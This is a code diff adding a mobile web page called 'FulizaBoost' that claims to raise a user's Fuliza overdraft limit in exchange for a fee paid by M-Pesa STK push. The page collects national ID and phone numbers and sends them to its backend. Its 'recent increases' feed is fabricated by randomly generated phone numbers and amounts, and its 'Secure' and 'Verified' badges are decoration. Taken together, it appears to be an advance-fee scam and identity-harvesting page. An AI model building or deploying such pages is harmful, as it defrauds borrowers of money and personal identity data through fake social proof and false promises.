@@ -1,0 +1,749 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover"
+    />
+    <meta name="theme-color" content="#1a7a1a" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta
+      name="description"
+      content="FulizaBoost - Instant Fuliza limit increase. No paperwork, same-day access."
+    />
+    <title>FulizaBoost - Instant Limit Increase</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=swap"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <!-- MAIN SCREEN -->
+    <div id="mainScreen" class="screen active">
+      <div class="main-wrapper">
+        <h1 class="brand-title"><span>Fuliza</span><span>Boost</span></h1>
+        <p class="brand-sub">
+          Instant Limit Increase • No Paperwork • Same Day Access
+        </p>
+
+        <div class="info-box">
+          <div class="info-icon"><i class="fas fa-info"></i></div>
+          <span
+            >Choose your new Fuliza limit and complete the payment to get
+            instant access.</span
+          >
+        </div>
+
+        <div class="recent-box">
+          <div class="recent-title">
+            <i class="fas fa-bullhorn"></i> Recent increases
+          </div>
+          <div id="recentLoanItem" class="recent-loan-item">
+            0722****93 increased to Ksh 7,500 - 7 mins ago
+          </div>
+        </div>
+
+        <div class="progress-deco"></div>
+
+        <div class="card">
+          <div class="card-title">
+            <i class="fas fa-credit-card"></i> Select Your Fuliza Limit
+          </div>
+          <div class="loan-options-grid" id="loanOptionsGrid">
+            <!-- Injected by JavaScript -->
+          </div>
+
+          <button id="getNowBtn" class="btn-get-now" type="button">
+            <i class="fas fa-bolt"></i>
+            <span id="getBtnText">Get Ksh 5,000 Now</span>
+          </button>
+
+          <div class="security-badges">
+            <div class="security-badge"><i class="fas fa-lock"></i> Secure</div>
+            <div class="security-badge">
+              <i class="fas fa-shield-alt"></i> Encrypted
+            </div>
+            <div class="security-badge">
+              <i class="fas fa-bolt"></i> Instant
+            </div>
+            <div class="security-badge">
+              <i class="fas fa-check-circle"></i> Verified
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- REVIEW SCREEN -->
+    <div id="reviewScreen" class="screen">
+      <div class="main-wrapper">
+        <div style="text-align: center; margin-bottom: 24px">
+          <h2 style="font-size: 24px; color: #1a7a1a; font-weight: 800">
+            Review &amp; Confirm
+          </h2>
+          <p style="color: #5a7a5a">
+            Please verify your details before proceeding.
+          </p>
+        </div>
+
+        <div class="card" style="background: #fff; padding: 20px">
+          <div class="confirm-row">
+            <span class="label">Fuliza Amount</span
+            ><span class="value" id="reviewAmount">Ksh 5,000</span>
+          </div>
+          <div class="confirm-row">
+            <span class="label">Processing Fee</span
+            ><span class="value" id="reviewFee">Ksh 99</span>
+          </div>
+          <div class="confirm-row">
+            <span class="label">ID Number</span
+            ><span class="value" id="reviewId">-</span>
+          </div>
+          <div class="confirm-row" style="border-bottom: none">
+            <span class="label">Phone Number</span
+            ><span class="value" id="reviewPhone">-</span>
+          </div>
+        </div>
+
+        <div
+          style="
+            margin-top: 20px;
+            display: flex;
+            gap: 12px;
+            flex-direction: column;
+          "
+        >
+          <button
+            id="confirmPayBtn"
+            class="btn-continue"
+            type="button"
+            style="background: #1a7a1a"
+          >
+            <i class="fas fa-check-circle"></i> Confirm &amp; Pay
+          </button>
+          <button
+            id="goBackBtn"
+            class="btn-cancel-modal"
+            type="button"
+            style="background: #f4f4f4; color: #555"
+          >
+            <i class="fas fa-arrow-left"></i> Go back
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAYMENT PROCESSING SCREEN -->
+    <div id="paymentScreen" class="screen">
+      <div class="checking-screen" style="background: #eef5ee">
+        <div class="checking-card">
+          <h2>Processing your payment</h2>
+          <p style="color: #475569; margin-bottom: 10px">
+            Check
+            <strong id="paymentPhoneDisplay" style="color: #1a7a1a"
+              >0727279710</strong
+            >
+            and enter your M-PESA PIN to pay
+            <strong id="paymentAmountDisplay" style="color: #0d4d0d"
+              >KSh 99</strong
+            >.
+          </p>
+
+          <ul class="status-list" id="paymentStatusList">
+            <li id="pStep1" class="active">
+              <span class="icon"><i class="fas fa-spinner fa-spin"></i></span>
+              Sending STK push to your phone
+            </li>
+            <li id="pStep2">
+              <span class="icon"><i class="fas fa-clock"></i></span> Waiting for
+              you to enter M-PESA PIN
+            </li>
+            <li id="pStep3">
+              <span class="icon"><i class="fas fa-clock"></i></span> Confirming
+              payment
+            </li>
+          </ul>
+
+          <div class="progress-track">
+            <div
+              class="progress-bar"
+              id="paymentProgressBar"
+              style="width: 33%"
+            ></div>
+          </div>
+
+          <p style="font-size: 0.85rem; color: #6c7a89; margin-top: 16px">
+            <i class="fas fa-lock" style="color: #1a7a1a"></i> Your payment is
+            secure and encrypted
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- DETAILS MODAL -->
+    <div class="modal-overlay" id="detailsModal">
+      <div class="modal-content">
+        <div class="modal-icon-wrap">
+          <div class="modal-icon-circle"><i class="fas fa-info"></i></div>
+        </div>
+        <div class="modal-body">
+          <h3>Enter Your Details</h3>
+          <div class="modal-sub">
+            <i class="fas fa-user-check" style="color: #aaa"></i> Provide your
+            details to proceed
+          </div>
+
+          <label for="idNumber" class="field-label">
+            <i class="fas fa-id-card"></i> ID Number
+          </label>
+          <input
+            type="text"
+            id="idNumber"
+            class="form-input"
+            placeholder="Enter your ID number"
+            inputmode="numeric"
+            autocomplete="off"
+            autocorrect="off"
+            autocapitalize="off"
+            spellcheck="false"
+            maxlength="10"
+          />
+
+          <label for="phoneNumber" class="field-label">
+            <i class="fas fa-mobile-alt"></i> Phone Number
+          </label>
+          <div class="phone-row">
+            <div class="phone-prefix">+254</div>
+            <input
+              type="tel"
+              id="phoneNumber"
+              class="phone-input"
+              placeholder="712 345 678"
+              inputmode="numeric"
+              autocomplete="tel"
+              autocorrect="off"
+              autocapitalize="off"
+              spellcheck="false"
+              maxlength="10"
+            />
+          </div>
+
+          <div class="mpesa-note">
+            <i class="fas fa-info-circle" style="color: #1a7a1a"></i>
+            We'll send an M-Pesa STK push to your phone number for payment
+          </div>
+
+          <button id="submitDetailsBtn" class="btn-continue" type="button">
+            Continue
+          </button>
+          <button id="cancelModalBtn" class="btn-cancel-modal" type="button">
+            Cancel
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ALERT MODAL -->
+    <div class="alert-modal" id="alertModal">
+      <div class="alert-modal-content">
+        <div class="alert-modal-header" id="alertModalHeader">
+          <div class="alert-modal-icon" id="alertModalIcon"></div>
+          <h3 class="alert-modal-title" id="alertModalTitle"></h3>
+        </div>
+        <div class="alert-modal-body">
+          <p class="alert-modal-message" id="alertModalMessage"></p>
+        </div>
+        <div class="alert-modal-footer">
+          <button id="alertOkBtn" class="btn-alert-ok" type="button">OK</button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ============================================================
+      // STATE
+      // ============================================================
+      const state = {
+        selectedLoanAmount: 5000,
+        selectedLoanFee: 99,
+        paymentCheckInterval: null,
+        currentAppData: null,
+        isSubmitting: false, // prevent double click
+        errorShown: false, // show error only once
+      };
+
+      // ============================================================
+      // DOM REFS
+      // ============================================================
+      const DOM = {
+        mainScreen: document.getElementById("mainScreen"),
+        reviewScreen: document.getElementById("reviewScreen"),
+        paymentScreen: document.getElementById("paymentScreen"),
+        detailsModal: document.getElementById("detailsModal"),
+        alertModal: document.getElementById("alertModal"),
+
+        loanOptionsGrid: document.getElementById("loanOptionsGrid"),
+        getNowBtn: document.getElementById("getNowBtn"),
+        getBtnText: document.getElementById("getBtnText"),
+
+        reviewAmount: document.getElementById("reviewAmount"),
+        reviewFee: document.getElementById("reviewFee"),
+        reviewId: document.getElementById("reviewId"),
+        reviewPhone: document.getElementById("reviewPhone"),
+        confirmPayBtn: document.getElementById("confirmPayBtn"),
+        goBackBtn: document.getElementById("goBackBtn"),
+
+        paymentPhoneDisplay: document.getElementById("paymentPhoneDisplay"),
+        paymentAmountDisplay: document.getElementById("paymentAmountDisplay"),
+        pStep1: document.getElementById("pStep1"),
+        pStep2: document.getElementById("pStep2"),
+        pStep3: document.getElementById("pStep3"),
+        paymentProgressBar: document.getElementById("paymentProgressBar"),
+
+        idNumber: document.getElementById("idNumber"),
+        phoneNumber: document.getElementById("phoneNumber"),
+        submitDetailsBtn: document.getElementById("submitDetailsBtn"),
+        cancelModalBtn: document.getElementById("cancelModalBtn"),
+
+        alertModalHeader: document.getElementById("alertModalHeader"),
+        alertModalIcon: document.getElementById("alertModalIcon"),
+        alertModalTitle: document.getElementById("alertModalTitle"),
+        alertModalMessage: document.getElementById("alertModalMessage"),
+        alertOkBtn: document.getElementById("alertOkBtn"),
+
+        recentLoanItem: document.getElementById("recentLoanItem"),
+      };
+
+      // ============================================================
+      // LOAN OPTIONS DATA
+      // ============================================================
+      const loanOptions = [
+        { amount: 5000, fee: 99 },
+        { amount: 7500, fee: 150 },
+        { amount: 10000, fee: 240 },
+        { amount: 12500, fee: 360 },
+        { amount: 16000, fee: 450 },
+        { amount: 21000, fee: 570 },
+        { amount: 25500, fee: 670 },
+        { amount: 30000, fee: 780 },
+        { amount: 35000, fee: 910 },
+        { amount: 40000, fee: 1050 },
+        { amount: 45000, fee: 1200 },
+        { amount: 50000, fee: 1400 },
+        { amount: 60000, fee: 1600 },
+        { amount: 70000, fee: 2000 },
+      ];
+
+      // ============================================================
+      // UTILITY FUNCTIONS
+      // ============================================================
+      function showScreen(id) {
+        document
+          .querySelectorAll(".screen")
+          .forEach((s) => s.classList.remove("active"));
+        document.getElementById(id).classList.add("active");
+        // Scroll to top whenever screen changes (important on mobile)
+        window.scrollTo({ top: 0, behavior: "auto" });
+      }
+
+      function showAlertModal(message, type = "info", title = "") {
+        const header = DOM.alertModalHeader;
+        const icon = DOM.alertModalIcon;
+        const titleEl = DOM.alertModalTitle;
+        const msgEl = DOM.alertModalMessage;
+
+        header.className = "alert-modal-header " + type;
+
+        const icons = {
+          success: "fas fa-check-circle",
+          error: "fas fa-times-circle",
+          warning: "fas fa-exclamation-triangle",
+          info: "fas fa-info-circle",
+        };
+        icon.innerHTML = '<i class="' + (icons[type] || icons.info) + '"></i>';
+
+        const titles = {
+          success: "Success",
+          error: "Error",
+          warning: "Warning",
+          info: "Information",
+        };
+        titleEl.textContent = title || titles[type] || "Information";
+        msgEl.textContent = message;
+
+        DOM.alertModal.classList.add("show");
+      }
+
+      function closeAlertModal() {
+        DOM.alertModal.classList.remove("show");
+      }
+
+      // ============================================================
+      // RENDER LOAN OPTIONS
+      // ============================================================
+      function renderLoanOptions() {
+        DOM.loanOptionsGrid.innerHTML = loanOptions
+          .map(
+            (opt, index) => `
+          <div class="loan-option ${index === 0 ? "selected" : ""}" data-amount="${opt.amount}" data-fee="${opt.fee}">
+            <div class="loan-amount">Ksh ${opt.amount.toLocaleString()}</div>
+            <div class="loan-fee">Fee: Ksh ${opt.fee.toLocaleString()}</div>
+          </div>
+        `,
+          )
+          .join("");
+
+        const first = DOM.loanOptionsGrid.querySelector(".loan-option");
+        if (first) {
+          state.selectedLoanAmount = parseInt(first.dataset.amount);
+          state.selectedLoanFee = parseInt(first.dataset.fee);
+          DOM.getBtnText.textContent = `Get Ksh ${state.selectedLoanAmount.toLocaleString()} Now`;
+        }
+
+        DOM.loanOptionsGrid.querySelectorAll(".loan-option").forEach((el) => {
+          el.addEventListener("click", function () {
+            DOM.loanOptionsGrid
+              .querySelectorAll(".loan-option")
+              .forEach((o) => o.classList.remove("selected"));
+            this.classList.add("selected");
+            state.selectedLoanAmount = parseInt(this.dataset.amount);
+            state.selectedLoanFee = parseInt(this.dataset.fee);
+            DOM.getBtnText.textContent = `Get Ksh ${state.selectedLoanAmount.toLocaleString()} Now`;
+          });
+        });
+      }
+
+      // ============================================================
+      // MODAL CONTROLS
+      // ============================================================
+      function showDetailsModal() {
+        DOM.detailsModal.classList.add("show");
+        // Prevent body scroll while modal open on mobile
+        document.body.style.overflow = "hidden";
+      }
+
+      function closeDetailsModal() {
+        DOM.detailsModal.classList.remove("show");
+        document.body.style.overflow = "";
+      }
+
+      // ============================================================
+      // SUBMIT DETAILS → REVIEW
+      // ============================================================
+      function submitDetails() {
+        const idNumber = DOM.idNumber.value.trim();
+        const phoneInput = DOM.phoneNumber.value.trim().replace(/\s/g, "");
+
+        if (!idNumber) {
+          showAlertModal(
+            "Please enter your ID number.",
+            "warning",
+            "Missing Information",
+          );
+          return;
+        }
+        if (!phoneInput || phoneInput.length < 9) {
+          showAlertModal(
+            "Please enter a valid phone number.",
+            "warning",
+            "Missing Information",
+          );
+          return;
+        }
+
+        const fullPhone = "+254" + phoneInput.replace(/^0+/, "");
+        const appData = {
+          idNumber,
+          phoneNumber: fullPhone,
+          selectedAmount: state.selectedLoanAmount,
+          selectedFee: state.selectedLoanFee,
+          timestamp: new Date().toISOString(),
+          applicationId: "APP-" + Date.now(),
+        };
+        localStorage.setItem("loanApplication", JSON.stringify(appData));
+        state.currentAppData = appData;
+
+        closeDetailsModal();
+        showReviewScreen(appData);
+      }
+
+      function showReviewScreen(data) {
+        DOM.reviewAmount.textContent =
+          "Ksh " + data.selectedAmount.toLocaleString();
+        DOM.reviewFee.textContent = "Ksh " + data.selectedFee.toLocaleString();
+        DOM.reviewId.textContent = data.idNumber;
+        DOM.reviewPhone.textContent = data.phoneNumber;
+        showScreen("reviewScreen");
+      }
+
+      function goBackToDetails() {
+        showScreen("mainScreen");
+        setTimeout(showDetailsModal, 300);
+      }
+
+      // ============================================================
+      // PAYMENT PROCESSING
+      // ============================================================
+      function updatePaymentStep(step, done) {
+        const stepMap = {
+          1: { el: DOM.pStep1, progress: 33 },
+          2: { el: DOM.pStep2, progress: 66 },
+          3: { el: DOM.pStep3, progress: 100 },
+        };
+        const s = stepMap[step];
+        if (!s) return;
+
+        const li = s.el;
+        if (done) {
+          li.className = "done";
+          li.querySelector(".icon").innerHTML = "✅";
+        } else {
+          li.className = "active";
+          li.querySelector(".icon").innerHTML =
+            '<i class="fas fa-spinner fa-spin"></i>';
+        }
+        DOM.paymentProgressBar.style.width = s.progress + "%";
+      }
+
+      function handlePaymentSuccess(result, data) {
+        const successUrl =
+          "/loan-success?" +
+          "amount=" +
+          encodeURIComponent(state.selectedLoanAmount) +
+          "&receipt=" +
+          encodeURIComponent(
+            result.data?.mpesa_receipt_number || "Processing",
+          ) +
+          "&phone=" +
+          encodeURIComponent(data.phoneNumber);
+
+        updatePaymentStep(3, true);
+        setTimeout(() => {
+          window.location.href = successUrl;
+        }, 1500);
+      }
+
+      function pollPaymentStatus(applicationId, data) {
+        if (state.paymentCheckInterval)
+          clearInterval(state.paymentCheckInterval);
+
+        let attempts = 0;
+        const maxAttempts = 60;
+
+        state.paymentCheckInterval = setInterval(async () => {
+          attempts++;
+          if (attempts > maxAttempts) {
+            clearInterval(state.paymentCheckInterval);
+            state.isSubmitting = false;
+            showScreen("mainScreen");
+            if (!state.errorShown) {
+              state.errorShown = true;
+              showAlertModal(
+                "Verification timed out.\n\nContact support with ID: " +
+                  applicationId,
+                "warning",
+                "Timeout",
+              );
+            }
+            return;
+          }
+          try {
+            const r = await fetch(
+              "/api/check-payment-status-by-app/" + applicationId,
+            );
+            const result = await r.json();
+            if (result.success) {
+              const s = result.status;
+              if (s === "completed" || s === "success" || s === "paid") {
+                clearInterval(state.paymentCheckInterval);
+                state.isSubmitting = false;
+                handlePaymentSuccess(result, data);
+              } else if (s === "cancelled" || s === "failed") {
+                clearInterval(state.paymentCheckInterval);
+                state.isSubmitting = false;
+                showScreen("mainScreen");
+                if (!state.errorShown) {
+                  state.errorShown = true;
+                  showAlertModal(
+                    result.message || "Payment failed. Please try again.",
+                    "error",
+                    "Payment Failed",
+                  );
+                }
+              }
+            }
+          } catch (e) {
+            // keep polling
+          }
+        }, 2000);
+      }
+
+      async function proceedToPayment(data) {
+        if (state.isSubmitting) return;
+        state.isSubmitting = true;
+        state.errorShown = false; // reset for this attempt
+
+        // Show payment screen
+        showScreen("paymentScreen");
+        DOM.paymentPhoneDisplay.textContent = data.phoneNumber;
+        DOM.paymentAmountDisplay.textContent =
+          "KSh " + data.selectedFee.toLocaleString();
+
+        try {
+          const response = await fetch("/api/loan-application", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              phoneNumber: data.phoneNumber,
+              idNumber: data.idNumber,
+              selectedAmount: data.selectedAmount,
+              selectedFee: data.selectedFee,
+              applicationId: data.applicationId,
+              timestamp: data.timestamp,
+            }),
+          });
+
+          const result = await response.json();
+
+          if (result.success) {
+            const txId = result.transaction_id || data.applicationId;
+            updatePaymentStep(1, true);
+            updatePaymentStep(2, false);
+            const appId = result.data?.application_id || txId;
+            pollPaymentStatus(appId, data);
+          } else {
+            state.isSubmitting = false;
+            showScreen("mainScreen");
+            showAlertModal(
+              result.message || "Failed to send STK push. Please try again.",
+              "error",
+              "Error",
+            );
+          }
+        } catch (error) {
+          console.error(error);
+          state.isSubmitting = false;
+          showScreen("mainScreen");
+          showAlertModal(
+            "Network error. Please check your connection and try again.",
+            "error",
+            "Connection Error",
+          );
+        }
+      }
+
+      // ============================================================
+      // RECENT LOANS TICKER
+      // ============================================================
+      function generateRandomPhone() {
+        const prefixes = [
+          "0721",
+          "0722",
+          "0723",
+          "0725",
+          "0710",
+          "0711",
+          "0720",
+          "0729",
+          "0706",
+          "0724",
+          "0790",
+          "0791",
+        ];
+        const p = prefixes[Math.floor(Math.random() * prefixes.length)];
+        const last = String(Math.floor(Math.random() * 100)).padStart(2, "0");
+        return p + "****" + last;
+      }
+
+      function generateRandomAmount() {
+        const amounts = [
+          4200, 5000, 7500, 10000, 12500, 16000, 21000, 25500, 30000, 35000,
+          40000, 45000, 50000, 60000, 70000,
+        ];
+        return amounts[Math.floor(Math.random() * amounts.length)];
+      }
+
+      function generateRandomTime() {
+        const times = [
+          "just now",
+          "1 min ago",
+          "2 mins ago",
+          "3 mins ago",
+          "5 mins ago",
+          "7 mins ago",
+        ];
+        return times[Math.floor(Math.random() * times.length)];
+      }
+
+      function displayRecentLoan() {
+        const el = DOM.recentLoanItem;
+        if (!el) return;
+        const phone = generateRandomPhone();
+        const amount = generateRandomAmount().toLocaleString();
+        const time = generateRandomTime();
+        el.style.opacity = 0;
+        setTimeout(() => {
+          el.textContent = phone + " increased to Ksh " + amount + " - " + time;
+          el.style.transition = "opacity 0.5s";
+          el.style.opacity = 1;
+        }, 300);
+        setTimeout(displayRecentLoan, 3000);
+      }
+
+      // ============================================================
+      // EVENT BINDING
+      // ============================================================
+      function init() {
+        renderLoanOptions();
+
+        DOM.getNowBtn.addEventListener("click", showDetailsModal);
+        DOM.submitDetailsBtn.addEventListener("click", submitDetails);
+        DOM.cancelModalBtn.addEventListener("click", closeDetailsModal);
+        DOM.confirmPayBtn.addEventListener("click", function () {
+          if (state.currentAppData) {
+            proceedToPayment(state.currentAppData);
+          }
+        });
+        DOM.goBackBtn.addEventListener("click", goBackToDetails);
+        DOM.alertOkBtn.addEventListener("click", closeAlertModal);
+
+        DOM.detailsModal.addEventListener("click", function (e) {
+          if (e.target === this) closeDetailsModal();
+        });
+
+        // Allow Enter key inside phone field to submit
+        DOM.phoneNumber.addEventListener("keydown", function (e) {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            submitDetails();
+          }
+        });
+
+        // Only allow digits in ID and phone (defensive on top of inputmode)
+        DOM.idNumber.addEventListener("input", function () {
+          this.value = this.value.replace(/\D/g, "");
+        });
+        DOM.phoneNumber.addEventListener("input", function () {
+          this.value = this.value.replace(/\D/g, "");
+        });
+
+        displayRecentLoan();
+
+        window.addEventListener("beforeunload", function () {
+          if (state.paymentCheckInterval)
+            clearInterval(state.paymentCheckInterval);
+        });
+      }
+
+      document.addEventListener("DOMContentLoaded", init);
+    </script>
+  </body>
+</html>
